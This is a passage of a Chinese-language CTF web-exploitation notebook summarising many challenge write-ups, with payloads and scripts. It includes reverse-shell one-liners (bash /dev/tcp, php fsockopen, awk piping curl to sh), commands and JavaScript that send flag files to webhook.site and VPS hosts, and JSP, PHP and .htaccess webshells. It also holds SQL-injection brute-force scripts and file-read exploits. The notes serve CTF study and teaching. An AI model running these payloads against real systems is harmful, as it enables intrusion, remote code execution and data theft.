也可以用XMLHttpRequest：

```js
<script> const xhr = new XMLHttpRequest(); xhr.open('POST', '{URL}/email');xhr.setRequestHeader('Content-Type', 'application/json');xhr.send(JSON.stringify({newEmail: "your_email_here"})); </script>
```

161. [Quotify](https://github.com/Dhanush-T/PCTF23-writeups/blob/main/web/Quotify/writeup.md)
- JSONP路由callback的利用
- [mXss](https://security.stackexchange.com/questions/46836/what-is-mutation-xss-mxss)（mutaion Xss，突变xss）+DOM Clobbering

介绍mXss的[视频](https://www.youtube.com/watch?v=Haum9UpIQzU)(16:00开始)。内容可以简述为这篇[帖子](https://juejin.cn/post/6844903571578699790)的内容。这道题使用的mXss可能更像[这种](https://xz.aliyun.com/t/6413)。这道题需要利用JSONP调用一个函数，但这个函数有一些限制。因为输入的内容会被放入div标签中，于是用mXss使dom变异，多出来的结构刚好可以提供给DOM Clobbering。

162. [Proxy It](https://github.com/Dhanush-T/PCTF23-writeups/blob/main/web/ProxyIt/writeup.md)。利用[request smuggling](https://portswigger.net/web-security/request-smuggling)（请求走私）访问被禁止的路径。
163. [Pages of Turmoil](https://github.com/Dhanush-T/PCTF23-writeups/blob/main/web/PagesOfTurmoil/writeup.md)。
- 利用Chrome的[Text Fragments](https://developer.mozilla.org/en-US/docs/Web/Text_fragments)控制页面高亮、翻页到特定位置。
- MongoDB [ObjectId](https://www.mongodb.com/docs/manual/reference/method/ObjectId/)格式。
164. [Lerdof's Records](https://github.com/Dhanush-T/PCTF23-writeups/blob/main/web/Lerdof's%20Records/writeup.md)
- php的strcmp()只会对比null字节之前的字符，但strlen函数计算字符串长度是包含null字节

补充：当strcmp的参数是数组时，会抛出warning且返回true，故可绕过。例如下方代码：

```php
<?php
    $flag="";
    try {
        if (isset($_GET['username']) && isset($_GET['password'])) {
            if (strcmp($_GET['username'], $flag)==0 && strcmp($_GET['password'], $flag)==0)
                echo $flag;
            els
                echo "Invalid username or password";
        }
    } catch (Throwable $th) {
        echo $flag;
    }
?>
```

可用`https://xxx.com/?username=a&password[0]=b`绕过。一般情况直接传数组就行，有的时候需要数组里赋值。也可用`https://xxx.com/username=aaa&password[]=[]`

- php[序列化字符串](https://www.neatstudio.com/show-161-1.shtml)利用引用符号R绕过`secret1 === secret2`。
165. [Christmas Heist](https://github.com/Dhanush-T/PCTF23-writeups/blob/main/web/ChristmasHeist/writeup.md)
- 一个代表windows95的User-agent：`Opera/9.80 (Windows 95) Presto/2.12.388 Version/12.13`
- 一个来自土耳其的ip：`31.143.76.255`
- [hashcat](https://github.com/hashcat/hashcat)爆破jwt密钥:`hashcat -a0 -m 16500 jwt.hash rockyou.txt --show`。其中jwt.hash为要爆破的jwt值。
167. [Restricted Access](https://deyixtan.github.io/posts/wxmctf2023/web2-restricted-access/)
- [http](https://developer.mozilla.org/en-US/docs/Web/HTTP)报文头（header）相关内容。
- User-Agent指定使用的设备
- Referer指定来自何处。题目这里给的提示是maclyonsden.com，实际要加的却是`Referer: https://maclyonsden.com/`。注意多试。
- Date指定访问日期。
- 将Upgrade-Insecure-Requests的值设为1可指定服务器返回加密的安全回复。
- 网速/网络相关：Downlink，ECT或RTT。
168. [NFTs](https://deyixtan.github.io/posts/wxmctf2023/web3-nfts/)
- python无限制/任意文件上传（[Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)）+文件存储路径拼接文件名导致的文件覆盖。
- 此题可以上传任意名字的任意文件，且文件名经过拼接存储。那么就可以上传`../app.py`覆盖原本flask的app.py，使其返回flag。
169. [Brawl: Shopping Spree](https://deyixtan.github.io/posts/wxmctf2023/web4-brawl-shopping-spree/)
- sqlite union联合注入（要注入的表名已知）。
  - > 测试语句：`' UNION SELECT 1,2,3,4,5 FROM skins WHERE '1' = '1`。
  - > 从sqlite_master表中找出指定表的结构：`' UNION SELECT sql,1,1,1,1 FROM sqlite_master WHERE name='secretskins`(表名secretskins需要已知)
  - > 查询出值：`' UNION SELECT skinid,description,image,1,1 as name FROM secretskins WHERE '1' = '1`.
170. [OURspace](https://deyixtan.github.io/posts/wxmctf2023/web5-ourspace/)
- 使用js代码创建form绕过CSP `script-src 'none'`执行xss
```js
const form = document.createElement("form");
const username = document.createElement("input");
const password = document.createElement("input");
username.name = "username";
username.value = "1";
password.name = "password";
password.value = "1";
form.method = "POST"
form.action = "http://127.0.0.1:3000/login";
form.appendChild(username);
form.appendChild(password);
document.getElementsByTagName("body")[0].appendChild(form);
form.submit();
//或者
javascript:{
var form = document.createElement("form");
form.method = "POST";
form.action = "http://127.0.0.1:3000/login";
var element1 = document.createElement("input"); 
var element2 = document.createElement("input");  
element1.value="123456";
element1.name="username";
form.appendChild(element1);  
element2.value="123456";
element2.name="password";
form.appendChild(element2);
document.body.appendChild(form);
form.submit();
}
```
-  绕过`<p style="display: none;">`标签，使标签内的内容显现出来。此题由于会在p标签前直接插入用户可控制内容，导致可以构造另一个未闭合的标签p(`<p name="`)来吞掉目标标签p的`display: none;`属性。或是设置style标签：
```html
<style>
p {
display: inline !important; /* https://developer.mozilla.org/en-US/docs/Web/CSS/important */
margin-top: -24rem;
position: absolute;
}
</style>
```

`!important`的优先级比`display: none;`高，高亮标签内的内容。

171. 使用ngrok转发tcp端口,实现反弹远程shell。[How to catch a Reverse shell over the Internet](https://systemweakness.com/how-to-catch-a-reverse-shell-over-the-internet-66d1be5f7bb9)。

```
ngrok tcp 7777
//另一个终端窗口监听指定tcp端口
nc -lv 7777
```

172. [[网鼎杯 2020 青龙组]filejava](http://www.xianxianlabs.com/blog/2020/06/02/377.html)
- 路径穿越导致任意文件下载漏洞。因为是java题，所以根据[Java web应用目录结构](https://www.qikegu.com/docs/1424)，下载WEB-INF里面的web.xml，获取所有的类源码文件。
- poi-ooxml-3.10（一个处理word文档，excel文件的组件）的excel-xxe漏洞：[CVE-2014-3529](https://xz.aliyun.com/t/6996)利用。
173. git文件夹泄露后的版本回退。题目提示flag在git的旧版本里，且可获得完整.git目录。首先用[GitHacker](https://github.com/WangYihang/GitHacker)获取.git目录，然后进行[版本回退](https://www.liaoxuefeng.com/wiki/896043488029600/897013573512192)：`git reset --hard HEAD^`。
174. 绕过302重定向（[bypass 302 redirect](https://gostart.biz/en/how-to-bypass-a-302-redirect/)）。其中一个方法是用curl访问目标网址。
175. ip的两种表示[方式](https://blog.csdn.net/xiaolong_4_2/article/details/80857941)。
176. [msfroggenerator2](../../CTF/picoCTF/Web/msfroggenerator2.md)
- [docker-compose.yml](https://docs.docker.com/compose/compose-file/compose-file-v3/)，[nginx配置文件](https://www.cnblogs.com/54chensongxia/p/12938929.html)和[traefik](https://doc.traefik.io/traefik/routing/overview/)了解。
- js里的searchParams.get可以遍历，有可能存在列表参数，也就是多个 value 一个 key 。而Object.fromEntries 会把多个压缩成一个，并且总是取得最后面的那个。即连续给相同参数附不同值时，只会取到最后面的那个。
- nginx里的&是保留词，如果放在开头就会被nginx 当作另一个参数对待，不会读取。且无法用其url编码形式绕过，因为此题使用ngx.var.arg_xx读取请求的参数，而ngx.var.arg_xx在获取的时候不会进行 urldecode。
- Traefik会自动将url里的`;`替换为`&`。
- chrome puppteer不仅可以访问普通的url，还可以访问`javascript:代码`,`file:///`等协议。并且还可以使用正常浏览器的保存文件等功能。
- chrome对于file scheme有严格的保护机制。对于 fetch 等直接获取信息的东西，无法跨域。并且 file 处于特殊的地方，它和 data 一样都是以 null 作为 origin 并且不能互相访问。如果外部访问 file 的内容会被 chrome 阻止。也就是说，不能用任何 file 之外的东西直接获取 file 的内容，连 open 和 iframe 都不能访问到 file。但file 访问 file 的时候是不受这个限制的。需要注意的是从 file 访问 file 的时候，不能用跨域直接获取信息的方法，例如 fetch 和 open 的返回对象。但是 open 和 iframe 是可以正常用的。
177. [web签到](https://ctf-show.feishu.cn/docx/UpC6dtDqgo7VuoxXlcvcLwzKnqh#BEM2dgiACoGmg4x4jKXcJ6kGnQf)
- php中的数组可以直接赋值：
```php
$a[1][2][3][4]='b';
echo $a[1][2][3][4];
//输出b
```
- 如cookie名/内容带中文，需要转换编码再发送。
```python
cookie={"测试:".encode('utf-8').decode("latin-1"):'a'}
```
178. 下面的代码可以用+连接绕过。

```php
<?php
highlight_file(__FILE__); 
include "flag.php";  
if (isset($_GET['num'])){
     if ($_GET['num'] == 114514 && check($_GET['num'])){
              assert("intval($_GET[num])==1919810") or die());
              echo $flag;
     } 
} 

function check($str){
  return !preg_match("/[a-z]|\;|\(|\)/",$str);
}
//payload:?num=114514%2b1805296
```
179. 假设只能使用长度为3个字符以内的命令，但参数不限制，就可以用[awk](https://wangchujiang.com/linux-command/c/awk.html)命令反弹shell。`awk '{system("curl https://your-shell.com/ip:port|sh")}'`
180. php也有整型溢出。例题:[茶歇区](https://blog.csdn.net/miuzzx/article/details/127830557#t16)
181. AES的ECB模式下，一组密文对应一组明文，也就是说，可以通过改变密文的顺序从而改变解密后明文的顺序。甚至说，可以自己移除某一段密文，只要解密后的明文有效就行。例题:[龙珠NFT](https://ctf-show.feishu.cn/docx/UpC6dtDqgo7VuoxXlcvcLwzKnqh)
182. php环境下的反弹shell（reverse shell）命令。`php -r '$sock=fsockopen("IP",PORT);exec("/bin/sh <&3 >&3 2>&3");'`.
183. [被遗忘的反序列化](https://blog.csdn.net/qq_63928796/article/details/129968742#t1)
- php反序列化漏洞。
- `$_SERVER["HTTP_AAAAAA"]`表示请求header中`aaaaaa`字段的值。
- [php原生类利用](https://www.anquanke.com/post/id/264823)：GlobIterator通过模式匹配遍历文件目录；SplFileObject读取指定文件内容。注意SplFileObject读取文件时是一行一行读的，所以直接`echo new SplFileObject(path)`只会出第一行的内容。似乎用伪协议就没有这个问题。
184. python一句话木马：`__import__("os").popen("ls").read()`。
185. [easy_php](https://blog.csdn.net/m0_64815693/article/details/130038356)
- 使用C（custom object，类名类型）+ArrayObject（Serializable接口）绕过格式化字符串`/^[Oa]:[\d]+/i`过滤。注意此法无法绕过__wakeup。
- 单纯C可以绕过__wakeup。O标识符代表对象类型，而C标识符代表类名类型。如果将O替换为C，则在反序列化时会将其解释为一个新的类名字符串，从而创建一个新的类而不是对象。因为这个新的类没有被序列化过，所以它没有任何属性或方法。这样一来，在反序列化时，__wakeup魔术方法就不会被自动调用。但这种方法不能有属性，那么只能触发__construct和__destruct。
- 不过有C在的情况，会先检测这里类是否实现了Serializable接口。如果有的话，会将里面的值传入重写的unserialize方法。这是可以正常解析的，所以可以通过利用实现了Serializable接口的原生类，来解析正常解析里面的那一串。ArrayObject正是其中之一。
186. linux终端bash反弹shell命令。`bash -c "bash -l > /dev/tcp/IP/PORT 0<&1 2>&1"`
187. linux系统下的flag可能藏在环境变量中。可用`env`或`printenv`命令查看环境变量。
188. [babycat](https://codex.lemonprefect.cn/writeups/GKCTF%202021.html#babycat)
- java网站任意文件读取（读取WEB-INF/web.xml获取网站结构并读取源码）
- jsp一句话木马。
```jsp
<% if("a".equals(request.getParameter("pwd"))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print("<pre>"); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print("</pre>"); } %>
```

请求：`http://x.x.x.x/cmd.jsp?pwd=b&i=ls`
- json解析特性：JSON 中的内联注释不会影响其解析。如`{"username":"LemonPrefect","password":"pass","role":"superUserLemonPrefect","role"/**/:"admin"}`或`{"username":"LemonPrefect","password":"pass","role":"admin"/*,"role":"guest"*/}`。前者`"role"/**/:"admin"`会正常解析，后者`/*,"role":"guest"*/`不会解析（解析出来role是admin）
189. [[JMCTF 2021]UploadHub](https://blog.csdn.net/weixin_45669205/article/details/117047432)
- php任意文件上传：上传.htaccess改变网站配置。
- apache2.conf配置文件中：

```conf
<Directory ~ "/var/www/html/upload/[a-f0-9]{32}/">
        php_flag engine off
</Directory>
```

`php_flag engine off`设置会让整个目录不解析php，导致上传的php木马无效。
- .htaccess修改网站配置使其解析php。
```
<FilesMatch .htaccess>
SetHandler application/x-httpd-php 
Require all granted  
php_flag engine on	
</FilesMatch>

php_value auto_prepend_file .htaccess
#<?php eval($_POST['a']);?>
```

其中：
```
ForceType application/x-httpd-php
SetHandler application/x-httpd-php
```
强制所有匹配的文件被一个指定的处理器处理,这里为php。
```
Require all granted  #允许所有请求
php_flag engine on   #开启PHP的解析
php_value auto_prepend_file .htaccess 在主文件解析之前自动解析包含.htaccess的内容
```
- .htaccess文件的盲注。
```
<If "file('/flag')=~ '/flag{/'">
ErrorDocument 404 "wupco"
</If>
```
`~`用于开启“正则表达式”分析，正则表达式必须在双引号之间。如果匹配到flag就设置ErrorDocument 404为"wupco"。可以将中间的`flag{`一个字符一个字符地试错匹配，通过回显判断是否正确，即盲注。

190. md5截断多线程爆破脚本。

```python
#substr(md5(captcha), -6, 6) == "5e1df8"
import hashlib
from multiprocessing.dummy import Pool as ThreadPool 
def md5(s):  # 计算MD5字符串
    return hashlib.md5(str(s).encode('utf-8')).hexdigest()
keymd5 = '5e1df8'  # 已知的md5截断值
md5start = -6  # 设置题目已知的截断位置
def findmd5(sss):  # 输入范围 里面会进行md5测试
    key = sss.split(':')
    start = int(key[0])  # 开始位置
    end = int(key[1])  # 结束位置
    result = 0
    for i in range(start, end):
        if md5(i)[md5start:] == keymd5:
            result = i
            print(result)  # 打印
            break
list = []  # 参数列表
for i in range(1):  # 多线程的数字列表 开始与结尾.range里的数字表示爆破范围的线程数量
    list.append(str(10000000 * i) + ':' + str(10000000 * (i + 1)))
pool = ThreadPool()  # 多线程任务
pool.map(findmd5, list)  # 函数 与参数列表
pool.close()
pool.join()
```
192. [[BSidesCF 2019]Mixer](https://blog.csdn.net/weixin_44037296/article/details/112370510)
- AES ECB加密内容识别：修改密文的开头几个字节不影响末尾密文的解密（反之也成立，修改密文末尾的字节不影响开头明文的解密）。与CBC模式不同，CBC中修改前段密文解密出来的明文全部都会是乱码。
- ECB加密是16位一组，每组相互独立，加密后每组为32位。
- 在json中1.00 == 1（小数点后几个0都没问题）。
193. [[红明谷CTF 2021]JavaWeb](https://blog.csdn.net/Mrs_H/article/details/124035038)
- Apache [shiro](https://zhuanlan.zhihu.com/p/54176956)框架[判断](https://blog.csdn.net/qq_38154820/article/details/106726691)：可在 cookie 追加一个`rememberMe=xx`的字段，这个字段是rememberMeManager默认的。然后看响应头部可以看看是否有`Set-Cookie:rememberMe=deleteMe; `的字段。若有则是shiro框架。
- CVE-2020-11989,[Apache Shiro权限绕过](https://www.anquanke.com/post/id/222489)：当遇到无法访问的url（直接访问会重定向），可以考虑（假设要访问的url为/json）：
    - /;/json
    - url二次编码
- [jackson反序列化漏洞](https://b1ue.cn/archives/189.html)利用[工具](https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0)命令:`java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C 'curl [VPS_IP:PORT] -File=@/flag' -A "[VPS_IP]"`。命令成功执行后复制工具给出的符合要求的rmi地址，使用CVE-2019-14439(springboot)的链子：`["ch.qos.logback.core.db.JNDIConnectionSource",{"jndiLocation": "rmi://地址"}]`。需要公网ip。
194. [[FBCTF2019]Products Manager](https://www.cnblogs.com/wkzb/p/12286303.html)
- mysql中的字符串比较。数据库对字符串进行比较时，如果两个字符串的长度不一样，则会将较短的字符串末尾填充空格，使两个字符串的长度一致，比如，字符串A:[String]和字符串B:[String2]进行比较时，假设String2比String多了一个字符串，这时MySQL会将字符串A填充为[String ]，即在原来字符串后面加了一个空格，使两个字符串长度一致。如下两条查询语句：`select * from users where username='Dumb'`和`select * from users where username='Dumb '`。它们的查询结果是一致的，即第二条查询语句中Dumb后面的空格并没有对查询有任何影响。因为在MySQL把查询语句里的username和数据库里的username值进行比较时，它们就是一个字符串的比较操作，符合上述特征。
- insert截断。当设计一个字段时，我们都必须对其设定一个最大长度，比如CHAR(10)，VARCHAR(20)等等。但是当实际插入数据的长度超过限制时，数据库就会将其进行截断，只保留限定的长度。
- 利用上述两个特点，当我们想获取Dumb身份却又不知道其密码时，可以注册一个名为`Dumb         xx`的用户。添加的空格数取决于数据库需要多少字符才会截断，末尾添上任意字符，防止出现用户名已存在。在后面登录时，假设登录代码如下：

```php
<?php
$username = mysql_real_escape_string($_GET['username']);
$password = mysql_real_escape_string($_GET['password']);
$query = "SELECT username FROM users
WHERE username='$username'
AND password='$password' ";
$res = mysql_query($query, $database);
if($res) {
    if(mysql_num_rows($res) > 0){
        return $username;
    }
}
return Null;
?>
```

填入我们注册的`Dumb         xx`和密码是可以查出结果的。虽然用户信息是我们自己的，但查出的用户名是Dumb。如果后续使用用户名而不是用户信息进行逻辑处理，我们就完成了一次越权。

195. [[HCTF 2018]Hideandseek](https://www.cnblogs.com/Yhck/p/13644349.html)
- 软链接zip上传导致的任意文件读取。常出现于以下场景：网站允许上传zip并返回zip压缩的文件的内容。这时就能压缩一个想读取文件路径的软链接，返回的内容就会是想要读取的文件的内容了。
```python
import os
import requests
import sys


def make_zip():
    os.system('ln -s ' + sys.argv[2] + ' test_exp')
    os.system('zip -y test_exp.zip test_exp')


def run():
    make_zip()
    res = requests.post(sys.argv[1], files={'the_file': open('./test_exp.zip', 'rb')})
    print(res.text)

    os.system('rm -rf test_exp')
    os.system('rm -rf test_exp.zip')
run()
```
用法：`python3 s.py http://example/upload /proc/self/environ`。需要在linux环境下运行。
- python的uuid.getnode()方法以48位正整数形式获取硬件地址，也就是服务器的MAC地址。可使用脚本将16进制的mac地址转换为整数：

```python
mac = "76:22:18:a1:3d:35".split(":")
mac_int = [int(i, 16) for i in mac]
mac_bin = [bin(i).replace('0b', '').zfill(8) for i in mac_int]
mac_dec = int("".join(mac_bin), 2)
print(mac_dec)
```

196. [[WMCTF2020]Web Check in 2.0](https://npfs06.top/2021/02/01/%E5%AF%92%E5%81%87buu30%E8%A7%A3%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/)
- php绕过exit：
```php
if(isset($_GET['content'])) {
    $content = $_GET['content'];
    if(preg_match('/iconv|UCS|UTF|rot|quoted|base64/i',$content))
         die('hacker');
    if(file_exists($content))
        require_once($content);
    file_put_contents($content,'<?php exit();'.$content);
}
```

[file_put_contents](https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/)支持多个过滤器混用。这里把常用的用于绕过exit的过滤器过滤掉后，还有两种办法。第一种：因为file_put_contents中可以调用伪协议，而伪协议处理时会对过滤器urldecode一次，所以可以利用二次编码绕过。
```
?content=php://filter/write=string.%2572ot13|<?cuc @riny($_TRG[_]);?>/resource=npfs.php 
?content=npfs.php&_=system("ls /");
```

这道题因为会不断执行file_put_contents，所以每个shell只能利用一次，执行一条命令后需要重新上传。第二种：利⽤ zlib 的 zlib.deflate 和 zlib.inflate 来做，中间插⼊string.tolower，把空格和exit处理掉。而插入'%0d'是因为php标签是独立的,需要与php代码分割开。正好%0d是`\r`的url编码，可以用来分割。
```
?content=php://filter/zlib.deflate|string.tolower|zlib.inflate|?%3E%3C?php%0Deval($_POST[pass]);?%3E/resource=shell.php
(post ?content=shell.php)pass=system("ls /");
```
197. [Connect](https://github.com/tamuctf/tamuctf-2023/tree/master/web/connect)
- curl命令注入带出flag的几种方法
```python
command = "curl -s -D - -o /dev/null " + url
print(os.popen(command).read().strip())
```
    - 直接闭合使用shell命令cat出flag：`;cat flag.txt`
    - 闭合后再次使用curl将flag带出到webhook的url上：`; curl -s webhook/$(cat /flag.txt)`
        - 不使用分号闭合：`http://example.com+file:///flag.txt%0a`
        - 使用curl的参数1:`--upload-file /flag.txt {remote_server}`;2:`http://[link-webhook]/?c= -d @/flag.txt`;3:`-d @flag.txt webhook`或`-X POST -d @/flag.txt webhook`
198. [Migraine](https://github.com/tamuctf/tamuctf-2023/tree/master/web/migraine)
- js任意命令执行，但不能包含字母和数字且无回显。无字母数字这点可以用jsfuck绕过，无回显说明要把flag带到webhook上。但jsfuck中不能使用require,因为require只能在module中使用。只能用全局object process（process.mainModule.require）来访问系统api。
```js
var url = "webhook";
var n = 100;
var buffer = Buffer.allocUnsafe(n);
var fs = process.binding('fs');
var path = "flag.txt";
var fd = fs.open(path, 2, 3, 4, 5);
fs.read(fd, buffer, 0, n, 0, 0, 0);
var flag = buffer.toString();
fetch(url + "?flag=" + flag);
```
```js
process.mainModule.require('https').request({
    hostname: 'webhook.site',
    path: '/149f5661-002a-4618-8760-b7f1b8a0a7c4',
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': process.mainModule.require('fs').readFileSync('/flag.txt').toString().length
    }
}).write(process.mainModule.require('fs').readFileSync('/flag.txt').toString())
```
```js
fetch(["https"].concat(atob("Og==")).concat("//enmxw9zlg1zp.x.pipedream.net/data=").concat(process[Object.keys(process)[74]].require(["child"].concat(Object.keys(process)[71][0]).concat("process").join("")).execSync("cat /flag.txt").toString()).join(""))
```
```js
const js = `
import * as fs from 'node:fs';
fs.readFile('/flag.txt', 'utf8', (err, data) => {
  if (err) {
    fetch("https://webhook.site/5fa7108c-ebb7-4e4f-ac39-90118458370b/" + "failed");
    return;
  }
  fetch("https://webhook.site/5fa7108c-ebb7-4e4f-ac39-90118458370b/" + data);
});
`;
// This is a trick to get access to import https://2ality.com/2019/10/eval-via-import.html
const encodedJs = encodeURIComponent(js);
const dataUri = 'data:text/javascript;charset=utf-8,' + encodedJs;
import(dataUri);
```
```js
process.mainModule.require("express").response.send=function(){this.end(process.mainModule.constructor._load("fs").readFileSync("/flag.txt","utf-8"))}
```
- 另一种无字母数字的js写法：https://github.com/mrpapercut/nonalpha-js-obfuscator。
199. php文件包含rce。
```php
<?php
include $_REQUEST['file'];
```

当可以完全控制require/include的文件名时，就能使用[脚本](https://github.com/synacktiv/php_filter_chain_generator)获取rce payload:`python3 filter_chain.py — chain '<?php system("cat /flag.txt");?>'`.或者使用pearcmd.php上传木马getshell。
```
curl "http://example.com/?page=/usr/local/lib/php/pearcmd&+-c+/tmp/webshell.php+-d+man_dir=<?echo(system(\$_GET\['cmd'\]));?>+-s+"
curl "http://example.com/?page=/tmp/webshell&cmd=cat+/flag.txt"
```
200. [Logical](https://github.com/tamuctf/tamuctf-2023/tree/master/web/logical)
- sqlite布尔盲注（注意与sql区分，两者很像但脚本不能套用）。
  - 使用LIKE语句。注意`_`符号在sqlite like中匹配任意一个字符，所以要放在字符集最后或是转义。https://stackoverflow.com/questions/7323162/sqlite-like-and
```python
import requests
import string
target = ''
alphabet = string.ascii_letters + string.digits + '{$}#!?<>=*+.(),@^-_'
flag = list('flag{')
while flag[-1] != '}':
    for char in alphabet:
        r = requests.post(target, data={'username': f'admin\' and PASSWORD LIKE BINARY "{"".join(flag)}{char}%"-- '}) 
        if 'not exists' not in r.text:
            flag.append(char)
            print(''.join(flag))
            break
```
- 判断注入目标使用了哪些字符。[escape](https://blog.csdn.net/ameyume/article/details/8007149) 表示转义，直接用反斜杠也行。
```python
def enumerate_characters(charset=printable):
    used_charset = ""
    for char in charset:
        payload = f"admin' and password like '%|{char}%' escape '|"
        response = requests.post(URL, data={"username" : payload})
        
        if response.status_code == 200 and response.json()['res'] == 'exists':
            used_charset += char
       
    return used_charset
```
  - 多线程([concurrent.futures](https://python-parallel-programmning-cookbook.readthedocs.io/zh_CN/latest/chapter4/02_Using_the_concurrent.futures_Python_modules.html))LIKE并转义特殊符号
```python
import string
import urllib.parse
import concurrent.futures
import requests

session = requests.Session()
FLAG = "flag{"

def validate_current_password(char):
    # escape characters used by SQL's LIKE operator
    if char == "%":
        char = "\%"
    elif char == "_":
        char = "\_"
    
    # setting up request
    url = f""
    headers = { "Content-Type": "application/x-www-form-urlencoded" }
    user_input = "admin' AND password LIKE '" + FLAG + char + "%';"
    data = f"username={urllib.parse.quote(user_input)}"
    response = session.post(url, headers=headers, data=data)
    
    # not exists
    if response.status_code != 200:
        return None
    
    content = response.json()["res"]
    if content != "exists":
        return None
    
    # exists
    return char


added = True # check to stop loop when looped all ASCII characters and did not append to flag
# brute force
while not FLAG.endswith("}") and added == True:
    added = False
    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = [executor.submit(validate_current_password, c) for c in string.printable]
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result == None:
                continue
            FLAG += result
            added = True
            print(FLAG)
            executor.shutdown(wait=True, cancel_futures=True)
            break
        
    if added == False:
        break

print(f"Final flag: {FLAG}")
print("Done")
```
  - 使用SUBSTRING+ascii+二分法
```python
import requests
import string

host="" #challange server

false_data = {
        "username":"payload"
}
res = requests.post(host,data=false_data)
false_data = res.json()['res']

burteforce_string = string.printable

def sqli(pos,char):
    data = {
        "username":"admin' and ascii(SUBSTRING((SELECT password FROM users WHERE Username = 'admin'), %d, 1)) > %d#"%(pos,char)
    }
    r = requests.post(host,data=data)
    print(data, r.text)
    result = r.json()['res']

    
    return  result != false_data

def get_char(pos):
    lo, hi = 32, 128
    while lo <= hi: #calculating the first mid
        mid = lo + (hi - lo) 
        if sqli(pos, mid): 
            lo = mid + 1
        else:
            hi = mid - 1
    print(lo)
    return chr(lo)

blacklist_char = "'\""
flag = ''
for pos in range(10, 64):
    flag += get_char(pos)
    print("flag",flag)
```

201. [Flag Fetcher](https://astr.cc/blog/tamuctf-2023-writeup/#flag-fetcher)
- rust [actix-web](https://web.veaba.me/rust/actix-web/)入门。
```rs
#[get("/flag")]
async fn get_flag(){}
```

可以创建一个名为/flag的路由，内部逻辑在get_flag函数中定义。但光定义路由是不够的，还需要将该路由加到App中。如果不加会导致404。
```rs
HttpServer::new(move || {
    App::new()
        .service(get_flag)
})
```
- PathBuf extend函数的错误使用。
```rs
#[get("/static/{filename:.*}")]
async fn static_files(req: HttpRequest) -> Result<fs::NamedFile, Error> {
    let requested: PathBuf = req.match_info().query("filename").parse()?;
    let requested: PathBuf = requested
        .components()
        .filter(|&entry| entry != Component::ParentDir)
        .collect();

    let mut path = PathBuf::from_str("static").unwrap();
    path.extend(&requested);

    let file = fs::NamedFile::open(path)?;
    Ok(file.use_last_modified(true))
}
```
代码使用[PathBuf](https://rustwiki.org/zh-CN/std/path/struct.PathBuf.html )过滤掉`../`，但后续又用extend拼接上用户可控制的filename。extend的[内部](https://doc.rust-lang.org/1.69.0/src/std/path.rs.html#1755-1757)调用了push，而push在遇到绝对路径参数时会替代已有的path，导致路径穿越。因此只需访问`http://example.com/static//key`即可访问根目录下的key文件。

202. [Web LTO](https://astr.cc/blog/tamuctf-2023-writeup/#web-lto)
- 重用文件描述符（reuse file handles/descriptors)的风险。此题实现了下面的逻辑：
    - 用户上传文件，服务器在tmp下打开一个文件
    - seek到temp文件的开头，将内容用tar打包后返回，删除原本文件
漏洞点在于服务器在打开文件时没有考虑重名的问题。假设我们发送了一个持续十秒的post请求，此时有机器人上传flag.txt文件。服务器先打开了代表我们的文件的r+w文件句柄，同时因为文件重名导致服务器重用该文件句柄导致机器人上传的flag覆盖了空白文件。就算后续机器人删除了文件，但我们仍持有r+w的文件句柄，还是可以读文件。
- python实现慢速post。
```python
import requests, time

def generator():
    print("sending multipart header...")
    yield b"--boundary\r\nContent-Disposition: form-data; name=\"a\"; filename=\"flag.txt\"\r\n\r\n"

    print("sleeping...")
    time.sleep(15)

    print("finishing request...")
    yield b"\r\n--boundary--\r\n"

r = requests.post("http://example.com", headers={
    "Content-Type": "multipart/form-data; boundary=boundary"
}, data=generator(), cookies={"whoami": "nobody"})
print(r.text)
```
203. http [range](https://developer.mozilla.org/en-US/docs/Web/HTTP/Range_requests)字段头.可用于指定下载较大request的哪一部分。https://github.com/wani-hackase/wanictf2023-writeup/tree/main/web/64bps
204. [Extract Service 2](https://github.com/wani-hackase/wanictf2023-writeup/tree/main/web/extract2)
- 软链接（symlink）也可用于docx文件内部。docx文件内部有个word/document.xml，里面记录着word文档的文字。那么将这个文件替换为软链接，就能在服务器提取文字时读取任意文件。
```sh
mkdir word
cd word
ln -s /flag document.xml
cd ../
7z a exploit.zip word
```
205. [certified1](https://github.com/wani-hackase/wanictf2023-writeup/tree/main/web/certified1)
- rust ImageMagick web应用漏洞：[CVE-2022-44268](https://www.metabaseq.com/imagemagick-zero-days/).当处理png时，可能会导致服务器上的任意文件读取。[poc](https://github.com/voidz0r/CVE-2022-44268)
  - 注意这个漏洞无法读取/proc下的文件，因为/proc下的文件不是真正意义上的文件：https://superuser.com/questions/619955/how-does-proc-work。所以需要配合题目中自带的其他漏洞：[certified2](https://github.com/wani-hackase/wanictf2023-writeup/tree/main/web/certified2)
206. [Lambda](https://hackmd.io/@Solderet/SomeWriteupForWaniCTF2023-XogSiA#Lambda---web)
- AWS相关考点cheatsheet：https://github.com/pop3ret/AWSome-Pentesting/blob/main/AWSome-Pentesting-Cheatsheet.md
- 此题给出了AWS相关凭证，要求获取其lambda函数(A lambda function is a piece of code that is executed whenever is triggered by an event from an event source)内容。以下代码获取lambda函数名称：
```python
import boto3
from pprint import pprint

access_key_id = 
secret_access_key = #key_id和access_key属于凭证内容
region = #region可以在url里找到。题目发送登陆验证请求时抓包，会看见类似这样的url： https://k0gh2dp2jg.execute-api.ap-northeast-1.amazonaws.com/test 。这个url中ap-northeast-1就是region，k0gh2dp2jg则是API的ID

client = boto3.client(
    "apigateway",
    aws_access_key_id=access_key_id,
    aws_secret_access_key=secret_access_key,
    region_name=region
)

restApiId = client.get_rest_apis()['items'][0]['id']
print("Rest API ID:", restApiId)
resourceId = client.get_resources(restApiId=restApiId)['items'][0]['id']
print("Resource ID:", resourceId)
response = client.get_method(
    restApiId=restApiId,
    resourceId=resourceId,
    httpMethod="GET"
)
pprint(response)
```

获取函数名后就能得到其内容了。
```python
client = boto3.client("lambda",
